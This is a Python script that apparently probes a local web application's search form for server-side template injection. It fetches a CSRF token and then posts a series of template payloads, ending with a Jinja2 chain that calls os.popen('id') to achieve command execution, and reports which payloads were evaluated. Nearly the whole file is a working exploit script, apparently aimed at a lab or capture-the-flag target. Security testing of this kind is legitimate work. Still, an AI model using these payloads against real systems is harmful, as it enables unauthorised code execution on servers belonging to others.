import socket, urllib.request, urllib.parse, json, re, time, sys

base_url = "127.0.0.1:33077"
headers = {
    'User-Agent': 'Mozilla/5.0 (compat)',
    'Host': 'localhost'
}

payloads = [
    "{{ 7*7 }}",
    "{{ config }}",
    "{{ 7*'7' }}",
    "{{''.__class__}}",
    "{{request.application.__globals__.__builtins__}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
]

print(f"[Target] Testing http://{base_url}/search")
print(f"[Headers] {json.dumps(headers, indent=2)}")

try:
    import urllib.request
    
    # GET root
    print("\n[1] GET page...")
    req = urllib.request.Request(f"http://{base_url}/", headers=headers)
    with urllib.request.urlopen(req, timeout=5) as resp:
        html = resp.read().decode('utf-8', errors='ignore')
        print(f"[Response] {len(html)}B | Status: {resp.status}")
        
        csrf = re.search(r'value="([a-zA-Z0-9]{32,64})"', html)
        if csrf:
            token = csrf.group(1)
            print(f"[CSRF] {token}")
        else:
            token = None
            print("[CSRF] Not found")
    
    # Test each payload
    results = []
    for idx, payload in enumerate(payloads, 1):
        print(f"\n[{idx}] Testing: {payload}")
        
        data = urllib.parse.urlencode({'search': payload, 'csrfmiddlewaretoken': token or ''})
        data_bytes = data.encode('ascii')
        
        req = urllib.request.Request(
            f"http://{base_url}/search",
            data=data_bytes,
            headers={**headers, 'Content-Type': 'application/x-www-form-urlencoded'}
        )
        
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                html = resp.read().decode('utf-8', errors='ignore')
                print(f"Status: {resp.status} | Size: {len(html)}")
                
                executed = '49' in html and '7*7' not in html
                has_django = 'django' in html.lower() or 'traceback' in html.lower()
                payload_found = payload in html
                
                results.append({
                    'idx': idx,
                    'executed': executed,
                    'has_django': has_django,
                    'payload_found': payload_found,
                    'size': len(html)
                })
                
                print(f"49 in response: {executed}")
                print(f"Django error: {has_django}")
                print(f"Payload in response: {payload_found}")
                print(f"Snippet: {html[:200]}...")
                
        except Exception as e:
            print(f"Error: {e}")
            results.append({'idx': idx, 'error': str(e)})
    
    print("\n[Summary]")
    for r in results:
        if 'error' in r:
            print(f"[{r['idx']}] Error: {r['error']}")
        else:
            status = "EXECUTED" if r['executed'] else "BLOCKED"
            print(f"[{r['idx']}] {status}")
    
except Exception as e:
    print(f"Fatal error: {e}")
    sys.exit(1)
